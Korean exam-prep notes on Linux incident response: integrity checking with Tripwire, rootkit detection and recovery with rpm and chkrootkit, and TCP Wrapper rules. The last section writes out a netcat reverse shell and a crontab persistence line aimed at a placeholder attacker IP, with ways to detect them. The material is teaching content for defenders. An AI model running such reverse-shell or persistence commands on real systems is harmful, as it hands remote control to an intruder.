## 한 줄 정의

침해된 시스템은 **기본 명령어(`ps`·`ls`·`netstat`)부터 거짓말을 한다**. 그래서 ① 파일 변조를 감지하는 **무결성 점검**, ② 오염된 명령을 우회하는 **대체 수단**, ③ 의심 파일을 해부하는 **분석 도구** 를 순서대로 알아야 한다. {{2-5}} {{15-12}} {{28-7}}

## 점검·스캔 도구 (빈출 빈칸)

|---|---|---|
| **Tripwire** | 파일시스템 **무결성** 점검 | 기준 해시 DB 를 만든 뒤 변경 탐지 (오픈소스 대안 AIDE) |

### Tripwire 동작 순서

1. `tripwire --init` — 기준(Baseline) 해시 DB 생성
2. 정상 운영
3. `tripwire --check` — 현재 해시와 기준 DB 비교
4. 변경 파일을 리포트로 출력

DB 위치는 `/var/lib/tripwire/*.twd`. **DB·바이너리가 변조되면 무의미**하므로 읽기전용 매체(WORM)에 따로 보관한다.

### Nessus vs Nikto

| | Nessus | Nikto |
|---|---|---|
| 성격 | Tenable 상용 (무료판 있음) | 오픈소스 |
| 대상 | 시스템 전반 (OS·네트워크·서비스) | **웹 서버 전용** (CGI·설정 오류) |
| 실행 | 8834/tcp 웹 UI, `/etc/init.d/nessusd restart` | `nikto -h [IP] -output vul.html -Format html` |

## TCP Wrapper {{2-6}}

`libwrap` 을 쓰는 서비스(inetd/xinetd 계열, sshd 등)의 호스트 기반 접근 통제다.

- `/etc/hosts.allow` 허용 (먼저 평가) → `/etc/hosts.deny` 거부
- 어느 쪽에도 없으면 **허용** → 보통 deny 에 `ALL: ALL`, allow 에 최소 허용
- `tcpd` 데몬이 중계하고 `/var/log/secure` 에 기록

## 루트킷에 장악된 시스템

`ps` · `ls` · `netstat` · `find` 가 트로이목마로 교체될 수 있다. 신뢰할 수 없으니 **다른 경로로 교차 확인**한다.

| 목적 | 오염 가능 명령 | 대체 |
|---|---|---|
| 프로세스 목록 | `ps` | **`lsof`** · `/proc` 직접 탐색 · `ls /proc` |
| 열린 포트·파일 | `netstat` | `lsof -i` · `ss` |
| 파일 목록 | `ls` | `echo *` · `find` (신뢰 매체) |

> [!시험] ps 결과와 /proc 결과가 다르면 루트킷 의심

### 삭제된 실행 파일을 가진 은닉 프로세스 {{15-12}}

`ls -al /proc/<PID>/exe` 가 `-> /path/backdoor (deleted)` 로 보이는 경우다.

- 이유: 공격자가 실행 후 **파일을 지웠지만 프로세스는 살아 있음**
- 복구: `cp /proc/<PID>/exe /tmp/sample` 로 바이너리 추출
- 인자 확인: `cat /proc/<PID>/cmdline`, `history`

### rpm 으로 변조 확인·복구 (`ps`·`netstat` 변조 시)

```bash
rpm -qf /bin/netstat /bin/ps       # ① 소속 패키지 확인 (net-tools, procps)
rpm -V net-tools procps            # ② 패키지 무결성 검증
lsattr /bin/netstat /bin/ps        # ③ immutable 플래그 확인
chattr -i /bin/netstat /bin/ps     # ④ immutable 해제 (공격자가 걸어 뒀을 수 있음)
rpm -Uvh --force [패키지명]         # ⑤ 강제 재설치로 원본 복구
chattr +i /bin/netstat /bin/ps     # ⑥ 재변조 방지
```

**`rpm -V` 출력 코드**

| 코드 | 의미 |
|---|---|
| `S` | 크기 변경 |
| `M` | 권한(모드) 변경 |
| **`5`** | **MD5 체크섬 불일치 = 변조 확실** |
| `T` | 타임스탬프 변경 |
| `U` / `G` | 소유자 / 그룹 변경 |
| `L` | 심볼릭 링크 변경 |

### chkrootkit

```bash
chkrootkit -q          # 이상 항목만 출력
# INFECTED: /bin/ps    → ps 가 루트킷으로 변조됨
```

## nc 리버스 셸 + cron 지속성 (시나리오 단골)

```bash
nc -lvp 80                                   # 공격자: 리스닝
nc [공격자IP] [Port] -e /bin/bash            # 피해 서버: 역방향 접속
echo "30 2 * * * root /usr/bin/nc [공격자IP] [Port] -e /bin/bash" >> /etc/crontab   # 재부팅 후에도 유지
```

탐지: `ps -ef | grep nc` · `netstat -antp | grep [공격자IP]` (외부 비정상 연결) · `/var/log/cron` · `cat /etc/crontab`
